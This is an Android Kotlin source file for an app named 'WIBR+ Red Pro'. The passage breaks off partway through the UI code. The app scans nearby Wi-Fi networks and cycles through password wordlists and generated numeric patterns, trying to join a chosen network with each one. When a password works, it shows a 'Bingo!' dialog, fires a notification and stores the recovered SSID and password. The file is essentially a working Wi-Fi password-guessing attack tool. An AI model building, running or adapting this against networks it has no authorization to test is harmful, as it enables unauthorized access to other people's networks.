package com.example.redwibrpro

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.net.wifi.SupplicantState
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLayoutDirection
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.LayoutDirection
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

data class ScannedWifiNetwork(
    val ssid: String,
    val bssid: String,
    val capabilities: String,
    val signalPercent: Int
)

data class SavedNetworkEntry(
    val ssid: String,
    val password: String,
    val savedAt: String
)

data class DictionarySource(
    val id: String,
    val title: String,
    val words: List<String>,
    val selected: Boolean = false
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        createSuccessNotificationChannel(this)
        setContent {
            val darkRedScheme = darkColorScheme(
                primary = Color(0xFFFF3B30),
                onPrimary = Color.White,
                primaryContainer = Color(0xFF4A0E0E),
                onPrimaryContainer = Color.White,
                secondary = Color(0xFFE53935),
                onSecondary = Color.White,
                background = Color(0xFF121316),
                onBackground = Color.White,
                surface = Color(0xFF222428),
                onSurface = Color.White
            )

            CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Ltr) {
                MaterialTheme(colorScheme = darkRedScheme) {
                    Surface(
                        modifier = Modifier.fillMaxSize(),
                        color = MaterialTheme.colorScheme.background
                    ) {
                        RedWibrClassicHomeApp(onExitApp = { finishAndRemoveTask() })
                    }
                }
            }
        }
    }
}

@Composable
fun RedWibrClassicHomeApp(onExitApp: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    val redAccent = Color(0xFFFF3B30)
    val darkBg = Color(0xFF121316)
    val barBg = Color(0xFF222428)
    val cardBg = Color(0xFF1B1C20)
    val textPrimary = Color(0xFFF5F5F7)

    val smallAssetWords = remember { loadAssetWordlist(context, "small_wordlist.txt") }
    val patternAssetWords = remember { loadAssetWordlist(context, "common_patterns.txt") }

    var dictionaries by remember {
        mutableStateOf(
            listOf(
                DictionarySource("bruteforce", "Bruteforce", generateNumericPatterns(), selected = false),
                DictionarySource("small", "Small Dictionary", smallAssetWords, selected = true),
                DictionarySource("middle", "Middle Dictionary", (patternAssetWords + smallAssetWords).distinct(), selected = false),
                DictionarySource("big", "Big Dictionary", (smallAssetWords + patternAssetWords + generateNumericPatterns()).distinct(), selected = false)
            )
        )
    }

    var intervalSeconds by remember { mutableIntStateOf(7) }
    var queueWords by remember { mutableStateOf(smallAssetWords) }

    var targetSsid by remember { mutableStateOf("") }
    var targetBssid by remember { mutableStateOf("00:00:00:00:00:00") }
    var targetEncryption by remember { mutableStateOf("[WPA2-PSK]") }
    var targetSignal by remember { mutableIntStateOf(0) }
    var hasSelectedNetwork by remember { mutableStateOf(false) }

    var isRunning by remember { mutableStateOf(false) }
    var currentIndex by remember { mutableIntStateOf(0) }
    var currentPassword by remember { mutableStateOf(queueWords.firstOrNull() ?: "12345678") }
    var statusBanner by remember { mutableStateOf("Ready") }
    var networkSummary by remember { mutableStateOf(inspectNetworkState(context)) }
    var lastIpAddress by remember { mutableStateOf("-") }
    var elapsedSeconds by remember { mutableIntStateOf(0) }
    var isTrying by remember { mutableStateOf(false) }

    var showScanDialog by remember { mutableStateOf(false) }
    var showDictDialog by remember { mutableStateOf(false) }
    var showManualDialog by remember { mutableStateOf(false) }
    var showHelpDialog by remember { mutableStateOf(false) }
    var searchQuery by remember { mutableStateOf("") }
    var scannedNetworks by remember { mutableStateOf<List<ScannedWifiNetwork>>(emptyList()) }
    var scanSummary by remember { mutableStateOf("Tap REFRESH") }

    var bingoDialogData by remember { mutableStateOf<Pair<String, String>?>(null) }
    var savedNetworks by remember { mutableStateOf(loadSavedNetworks(context)) }
    var activeCallback by remember { mutableStateOf<ConnectivityManager.NetworkCallback?>(null) }
    var runnerJob by remember { mutableStateOf<Job?>(null) }
    var singleTryJob by remember { mutableStateOf<Job?>(null) }

    val requiredPermissions = remember {
        buildList {
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.NEARBY_WIFI_DEVICES)
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    fun triggerRealWifiScan() {
        val outcome = performRealWifiScan(context)
        scannedNetworks = outcome.networks
        networkSummary = inspectNetworkState(context)
        scanSummary = outcome.summary
    }

    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        triggerRealWifiScan()
        statusBanner = "Permissions Ready"
    }

    val filePickerLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.OpenDocument()
    ) { uri: Uri? ->
        if (uri != null) {
            val loaded = readWordlistFromUri(context, uri)
            if (loaded.isNotEmpty()) {
                val fileName = uri.lastPathSegment?.substringAfterLast('/') ?: "custom_wordlist.txt"
                dictionaries = dictionaries + DictionarySource(
                    id = "file_${System.currentTimeMillis()}",
                    title = fileName,
                    words = loaded,
                    selected = true
                )
                queueWords = loaded
                currentIndex = 0
                currentPassword = loaded.first()
                statusBanner = "Loaded ${loaded.size}"
            } else {
                statusBanner = "Empty file"
            }
        }
    }

    fun cleanupCallback() {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        activeCallback?.let { cb ->
            runCatching { cm.unregisterNetworkCallback(cb) }
        }
        activeCallback = null
    }

    fun pauseRunner(newStatus: String = "Paused") {
        runnerJob?.cancel()
        runnerJob = null
        singleTryJob?.cancel()
        singleTryJob = null
        cleanupCallback()
        isRunning = false
        isTrying = false
        statusBanner = newStatus
        networkSummary = inspectNetworkState(context)
    }

    fun saveSuccessfulConnection(ssid: String, password: String) {
        val stamp = SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(Date())
        val updated = listOf(SavedNetworkEntry(ssid, password, stamp)) +
            savedNetworks.filterNot { it.ssid == ssid && it.password == password }
        savedNetworks = updated
        persistSavedNetworks(context, updated)
    }

    @Suppress("DEPRECATION")
    suspend fun executeRealConnectionAttempt(
        ssid: String,
        password: String,
        timeoutMs: Long
    ): Boolean {
        val cleanSsid = ssid.trim()
        val cleanPass = password.trim()
        if (cleanSsid.isEmpty()) {
            statusBanner = "Empty SSID"
            return false
        }

        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        if (wifiManager == null) {
            statusBanner = "Wi-Fi Unavailable"
            return false
        }

        val hasLocPerm = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!wifiManager.isWifiEnabled) {
            statusBanner = "Enabling Wi-Fi..."
            runCatching { wifiManager.isWifiEnabled = true }
            delay(1200L)
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            var addedNetId = -1
            val started = runCatching {
                if (hasLocPerm) {
                    wifiManager.configuredNetworks?.filter {
                        it.SSID?.removeSurrounding(""") == cleanSsid
                    }?.forEach { existing ->
                        wifiManager.removeNetwork(existing.networkId)
                    }
                }

                val conf = WifiConfiguration().apply {
                    SSID = """ + cleanSsid + """
                    if (cleanPass.isNotEmpty()) {
                        preSharedKey = """ + cleanPass + """
                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                        allowedProtocols.set(WifiConfiguration.Protocol.RSN)
                        allowedProtocols.set(WifiConfiguration.Protocol.WPA)
                        allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP)
                        allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP)
                        allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP)
                        allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP)
                    } else {
                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                    }
                    status = WifiConfiguration.Status.ENABLED
                    priority = 100000
                }

                addedNetId = wifiManager.addNetwork(conf)
                if (addedNetId == -1) {
                    statusBanner = "Add Config Failed"
                    return false
                }

                // Do NOT disconnect before enabling; enableNetwork(netId, true) + reconnect() switches directly
                val enabled = wifiManager.enableNetwork(addedNetId, true)
                val reconnected = wifiManager.reconnect()
                enabled || reconnected
            }.getOrDefault(false)

            if (!started) {
                statusBanner = "Enable Failed"
                return false
            }

            var waited = 0L
            val pollStep = 350L
            var sawHandshake = false

            while (waited < timeoutMs) {
                delay(pollStep)
                waited += pollStep

                val info = runCatching { wifiManager.connectionInfo }.getOrNull()
                val rawSsid = info?.ssid?.removeSurrounding(""") ?: ""
                val supplicant = info?.supplicantState
                val netId = info?.networkId ?: -1

                when (supplicant) {
                    SupplicantState.AUTHENTICATING,
                    SupplicantState.ASSOCIATING,
                    SupplicantState.ASSOCIATED,
                    SupplicantState.FOUR_WAY_HANDSHAKE,
                    SupplicantState.GROUP_HANDSHAKE -> {
                        sawHandshake = true
                        statusBanner = "Testing: ${supplicant.name}"
                    }
                    else -> Unit
                }

                val isTargetMatch = rawSsid.equals(cleanSsid, ignoreCase = true) ||
                    (netId == addedNetId && netId != -1)

                if (isTargetMatch && supplicant == SupplicantState.COMPLETED && netId != -1) {
                    val ipInt = info?.ipAddress ?: 0
                    if (ipInt != 0) {
                        lastIpAddress = String.format(
                            Locale.US,
                            "%d.%d.%d.%d",
                            ipInt and 0xff,
                            ipInt shr 8 and 0xff,
                            ipInt shr 16 and 0xff,
                            ipInt shr 24 and 0xff
                        )
                    }
                    return true
                }

                if (sawHandshake && waited >= 2200L &&
                    (supplicant == SupplicantState.DISCONNECTED ||
                        supplicant == SupplicantState.INACTIVE ||
                        supplicant == SupplicantState.INTERFACE_DISABLED)
                ) {
                    break
                }
            }

            if (addedNetId != -1) {
                runCatching {
                    wifiManager.disableNetwork(addedNetId)
                    wifiManager.removeNetwork(addedNetId)
                    wifiManager.reconnect()
                }
            }
            return false
        }

        cleanupCallback()
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val specifierBuilder = WifiNetworkSpecifier.Builder().setSsid(cleanSsid)
        if (cleanPass.isNotEmpty()) {
            specifierBuilder.setWpa2Passphrase(cleanPass)
        }

        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .setNetworkSpecifier(specifierBuilder.build())
            .build()

        var connected = false
        var failed = false
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                connected = true
            }

            override fun onLinkPropertiesChanged(network: Network, linkProperties: LinkProperties) {
                val ip = linkProperties.linkAddresses.firstOrNull()?.address?.hostAddress
                if (!ip.isNullOrBlank()) {
                    lastIpAddress = ip
                }
            }

            override fun onUnavailable() {
                failed = true
            }
        }

        activeCallback = callback
        runCatching { cm.requestNetwork(request, callback) }.onFailure { failed = true }

        var waited = 0L
        while (waited < timeoutMs && !connected && !failed) {
            delay(300L)
            waited += 300L
        }

        if (!connected) {
            cleanupCallback()
        }
        return connected
    }

    fun startWordlistSequence() {
        val words = if (queueWords.isNotEmpty()) {
            queueWords
        } else {
            dictionaries.firstOrNull { it.selected }?.words ?: smallAssetWords
        }

        if (targetSsid.isBlank()) {
            statusBanner = "Select SSID First"
            return
        }
        if (words.isEmpty()) {
            statusBanner = "Select Dictionary"
            return
        }

        pauseRunner("Running")
        isRunning = true

        runnerJob = scope.launch {
            var idx = currentIndex.coerceIn(0, words.lastIndex)
            while (isRunning && idx < words.size) {
                val candidate = words[idx]
                currentIndex = idx
                currentPassword = candidate
                statusBanner = "Trying ${idx + 1} of ${words.size}"
                networkSummary = inspectNetworkState(context)

                val stepStart = System.currentTimeMillis()
                val success = executeRealConnectionAttempt(
                    ssid = targetSsid,
                    password = candidate,
                    timeoutMs = intervalSeconds.coerceAtLeast(3) * 1000L
                )
                val tookSec = ((System.currentTimeMillis() - stepStart) / 1000L).toInt().coerceAtLeast(1)
                elapsedSeconds += tookSec

                if (success) {
                    isRunning = false
                    statusBanner = "Connected!"
                    saveSuccessfulConnection(targetSsid, candidate)
                    sendSuccessNotification(context, targetSsid, candidate)
                    bingoDialogData = targetSsid to candidate
                    networkSummary = inspectNetworkState(context)
                    break
                }

                statusBanner = "Wrong: $candidate"
                delay(250L)

                if (!isRunning) break

                idx++
                if (idx >= words.size) {
                    currentIndex = 0
                    isRunning = false
                    statusBanner = "Finished"
                    break
                }
            }
        }
    }

    DisposableEffect(context) {
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                if (intent?.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                    val updated = readScanResultsOnly(context)
                    if (updated.isNotEmpty()) {
                        scannedNetworks = updated
                        scanSummary = "Found ${updated.size} APs"
                    }
                }
            }
        }
        val filter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            context.registerReceiver(receiver, filter)
        }

        triggerRealWifiScan()

        onDispose {
            runCatching { context.unregisterReceiver(receiver) }
            runnerJob?.cancel()
            singleTryJob?.cancel()
            cleanupCallback()
        }
    }

    if (showHelpDialog) {
        AlertDialog(
            onDismissRequest = { showHelpDialog = false },
            containerColor = barBg,
            shape = MaterialTheme.shapes.small,
            modifier = Modifier.border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = {
                Text("Help - WIBR+ Red Pro", color = redAccent, fontSize = 19.sp, fontWeight = FontWeight.Black)
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text("1. Tap PERMS to grant Location & Wi-Fi permissions.", color = textPrimary, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                    Text("2. Tap Scan APs to select a network (or Add Network manually).", color = textPrimary, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                    Text("3. Once a network is selected, Dictionaries, Speed, and Add .txt File buttons appear.", color = textPrimary, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                    Text("4. Tap Try Now to test one password immediately, or Start to test the list.", color = textPrimary, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                }
            },
            confirmButton = {
                Button(
                    onClick = { showHelpDialog = false },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("OK", fontWeight = FontWeight.Black)
                }
            }
        )
    }

    bingoDialogData?.let { (winSsid, winPass) ->
        AlertDialog(
            onDismissRequest = { bingoDialogData = null },
            containerColor = barBg,
            shape = MaterialTheme.shapes.small,
            modifier = Modifier.border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .size(30.dp)
                            .border(2.dp, redAccent, MaterialTheme.shapes.extraSmall)
                            .background(darkBg),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("W+", color = redAccent, fontSize = 14.sp, fontWeight = FontWeight.Black)
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Text("Bingo!", color = redAccent, fontSize = 22.sp, fontWeight = FontWeight.Black)
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text("SSID: $winSsid", color = textPrimary, fontSize = 17.sp, fontWeight = FontWeight.Bold)
                    Text("Password: $winPass", color = redAccent, fontSize = 17.sp, fontWeight = FontWeight.Black)
                }
            },
            confirmButton = {
                Button(
                    onClick = { bingoDialogData = null },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("OK", fontWeight = FontWeight.Black)
                }
            }
        )
    }

    if (showManualDialog) {
        var manualSsid by remember { mutableStateOf("") }
        var manualPass by remember { mutableStateOf("") }
        AlertDialog(
            onDismissRequest = { showManualDialog = false },
            containerColor = barBg,
            modifier = Modifier.border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = { Text("Add Network", color = redAccent, fontSize = 19.sp, fontWeight = FontWeight.Black) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(
                        value = manualSsid,
                        onValueChange = { manualSsid = it },
                        label = { Text("SSID", color = redAccent, fontWeight = FontWeight.Bold) },
                        singleLine = true
                    )
                    OutlinedTextField(
                        value = manualPass,
                        onValueChange = { manualPass = it },
                        label = { Text("Password", color = redAccent, fontWeight = FontWeight.Bold) },
                        singleLine = true
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (manualSsid.isNotBlank()) {
                            targetSsid = manualSsid.trim()
                            targetBssid = "00:00:00:00:00:00"
                            targetEncryption = "[WPA2-PSK]"
                            targetSignal = 85
                            hasSelectedNetwork = true
                            if (manualPass.isNotBlank()) {
                                currentPassword = manualPass.trim()
                            }
                            statusBanner = "Ready"
                        }
                        showManualDialog = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("Set", fontWeight = FontWeight.Black)
                }
            },
            dismissButton = {
                TextButton(onClick = { showManualDialog = false }) {
                    Text("Cancel", color = Color.LightGray, fontWeight = FontWeight.Bold)
                }
            }
        )
    }

    if (showScanDialog) {
        val filtered = remember(scannedNetworks, searchQuery) {
            if (searchQuery.isBlank()) scannedNetworks
            else scannedNetworks.filter {
                it.ssid.contains(searchQuery, ignoreCase = true) ||
                    it.bssid.contains(searchQuery, ignoreCase = true)
            }
        }
        AlertDialog(
            onDismissRequest = { showScanDialog = false },
            containerColor = darkBg,
            modifier = Modifier
                .fillMaxWidth()
                .heightIn(max = 580.dp)
                .border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = scanSummary,
                        color = textPrimary,
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Black
                    )
                    Box(
                        modifier = Modifier
                            .background(barBg)
                            .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                            .clickable {
                                val hasPerm = requiredPermissions.all {
                                    ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                                }
                                if (!hasPerm) permissionLauncher.launch(requiredPermissions)
                                else triggerRealWifiScan()
                            }
                            .padding(horizontal = 10.dp, vertical = 5.dp)
                    ) {
                        Text(
                            text = "REFRESH",
                            color = redAccent,
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Black
                        )
                    }
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(
                        value = searchQuery,
                        onValueChange = { searchQuery = it },
                        label = { Text("Search SSID", color = redAccent, fontWeight = FontWeight.Bold) },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth()
                    )
                    if (filtered.isEmpty()) {
                        Text(
                            text = "Tap PERMS then REFRESH",
                            color = textPrimary,
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                    } else {
                        LazyColumn(
                            modifier = Modifier.heightIn(max = 360.dp),
                            verticalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            items(filtered) { net ->
                                val securityLabel = formatSecurityShort(net.capabilities)
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .background(barBg)
                                        .border(1.5.dp, Color(0xFF3A3A40))
                                        .clickable {
                                            targetSsid = net.ssid
                                            targetBssid = net.bssid
                                            targetEncryption = net.capabilities
                                            targetSignal = net.signalPercent
                                            hasSelectedNetwork = true
                                            statusBanner = "Ready"
                                            showScanDialog = false
                                        }
                                        .padding(horizontal = 12.dp, vertical = 10.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Column(
                                        modifier = Modifier.weight(1f),
                                        verticalArrangement = Arrangement.spacedBy(3.dp)
                                    ) {
                                        Text(
                                            text = net.ssid,
                                            color = redAccent,
                                            fontSize = 17.sp,
                                            fontWeight = FontWeight.Black,
                                            maxLines = 1,
                                            overflow = TextOverflow.Ellipsis
                                        )
                                        Text(
                                            text = securityLabel,
                                            color = textPrimary,
                                            fontSize = 13.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    }

                                    Spacer(modifier = Modifier.width(10.dp))

                                    Row(
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                                    ) {
                                        WifiSignalBarsIcon(
                                            signalPercent = net.signalPercent,
                                            activeColor = redAccent,
                                            inactiveColor = Color(0xFF43434A),
                                            modifier = Modifier.size(24.dp)
                                        )
                                        Text(
                                            text = "${net.signalPercent}%",
                                            color = textPrimary,
                                            fontSize = 14.sp,
                                            fontWeight = FontWeight.Black
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showScanDialog = false }) {
                    Text("Close", color = redAccent, fontWeight = FontWeight.Black)
                }
            }
        )
    }

    if (showDictDialog) {
        AlertDialog(
            onDismissRequest = { showDictDialog = false },
            containerColor = darkBg,
            modifier = Modifier
                .fillMaxWidth()
                .border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = { Text("Dictionaries & Speed", color = redAccent, fontSize = 18.sp, fontWeight = FontWeight.Black) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    dictionaries.forEach { dict ->
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(barBg)
                                .clickable {
                                    dictionaries = dictionaries.map {
                                        if (it.id == dict.id) it.copy(selected = !it.selected) else it
                                    }
                                }
                                .padding(horizontal = 8.dp, vertical = 6.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Checkbox(
                                    checked = dict.selected,
                                    onCheckedChange = {
                                        dictionaries = dictionaries.map { d ->
                                            if (d.id == dict.id) d.copy(selected = !d.selected) else d
                                        }
                                    },
                                    colors = CheckboxDefaults.colors(checkedColor = redAccent, uncheckedColor = redAccent)
                                )
                                Text(dict.title, color = redAccent, fontSize = 15.sp, fontWeight = FontWeight.Bold)
                            }
                            Text("${dict.words.size}", color = textPrimary, fontSize = 13.sp, fontWeight = FontWeight.Bold)
                        }
                    }

                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(barBg)
                            .padding(10.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("Speed: ${intervalSeconds}s", color = redAccent, fontSize = 15.sp, fontWeight = FontWeight.Black)
                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Button(
                                onClick = { if (intervalSeconds > 3) intervalSeconds -= 1 },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38383C), contentColor = Color.White)
                            ) { Text("-", fontWeight = FontWeight.Black) }
                            Button(
                                onClick = { intervalSeconds += 1 },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38383C), contentColor = Color.White)
                            ) { Text("+", fontWeight = FontWeight.Black) }
                        }
                    }

                    Button(
                        onClick = { filePickerLauncher.launch(arrayOf("text/plain", "*/*")) },
                        colors = ButtonDefaults.buttonColors(containerColor = barBg, contentColor = redAccent),
                        modifier = Modifier
                            .fillMaxWidth()
                            .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                    ) {
                        Text("Add .txt File", fontWeight = FontWeight.Black)
                    }
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        val merged = dictionaries.filter { it.selected }.flatMap { it.words }.distinct()
                        if (merged.isNotEmpty()) {
                            queueWords = merged
                            currentIndex = 0
                            currentPassword = merged.first()
                            statusBanner = "Ready (${merged.size})"
                        }
                        showDictDialog = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("Apply", fontWeight = FontWeight.Black)
                }
            }
        )
    }

    val totalCount = queueWords.size.coerceAtLeast(1)
    val progress = ((currentIndex + 1).toFloat() / totalCount.toFloat()).coerceIn(0f, 1f)
    val mainScroll = rememberScrollState()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(darkBg)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(barBg)
                .padding(horizontal = 12.dp, vertical = 10.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(34.dp)
                        .border(2.dp, redAccent, MaterialTheme.shapes.extraSmall)
                        .background(darkBg),
                    contentAlignment = Alignment.Center
                ) {
                    Text("W+", color = redAccent, fontSize = 16.sp, fontWeight = FontWeight.Black)
                }
                Spacer(modifier = Modifier.width(10.dp))
                Text(
                    text = "WIBR+ Red Pro",
                    color = textPrimary,
                    fontSize = 19.sp,
                    fontWeight = FontWeight.Black
                )
            }

            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(14.dp)
            ) {
                Text(
                    text = "HELP",
                    color = textPrimary,
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Black,
                    modifier = Modifier.clickable { showHelpDialog = true }
                )
                Text(
                    text = "EXIT",
                    color = redAccent,
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Black,
                    modifier = Modifier.clickable {
                        pauseRunner("Stopped")
                        (context as? Activity)?.finishAndRemoveTask() ?: onExitApp()
                    }
                )
            }
        }

        HorizontalDivider(thickness = 2.dp, color = redAccent)

        Box(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 8.dp, vertical = 8.dp)
                .background(barBg)
                .border(1.5.dp, Color(0xFF34363C), MaterialTheme.shapes.extraSmall)
                .clickable { showManualDialog = true }
                .padding(vertical = 13.dp),
            contentAlignment = Alignment.Center
        ) {
            Text(
                text = "Add Network",
                color = redAccent,
                fontSize = 19.sp,
                fontWeight = FontWeight.Black
            )
        }

        Column(
            modifier = Modifier
                .weight(1f)
                .fillMaxWidth()
                .verticalScroll(mainScroll)
                .padding(horizontal = 14.dp, vertical = 4.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            if (hasSelectedNetwork) {
                Text(
                    text = statusBanner,
                    color = redAccent,
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Black,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(6.dp))

                OutlinedTextField(
                    value = targetSsid,
                    onValueChange = { targetSsid = it },
                    label = { Text("SSID", color = redAccent, fontWeight = FontWeight.Bold) },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )

                Spacer(modifier = Modifier.height(6.dp))

                OutlinedTextField(
                    value = currentPassword,
                    onValueChange = { currentPassword = it },
                    label = { Text("Password", color = redAccent, fontWeight = FontWeight.Bold) },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )

                Spacer(modifier = Modifier.height(8.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Button(
                        onClick = { showDictDialog = true },
                        shape = MaterialTheme.shapes.extraSmall,
                        colors = ButtonDefaults.buttonColors(containerColor = barBg, contentColor = redAccent),
                        modifier = Modifier
                            .weight(1f)
                            .height(42.dp)
                            .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall),
                        contentPadding = PaddingValues(horizontal = 4.dp)
                    ) {
                        Text("Dictionaries", fontSize = 12.sp, fontWeight = FontWeight.Black, maxLines = 1)
                    }

                    Button(
                        onClick = { showDictDialog = true },
                        shape = MaterialTheme.shapes.extraSmall,
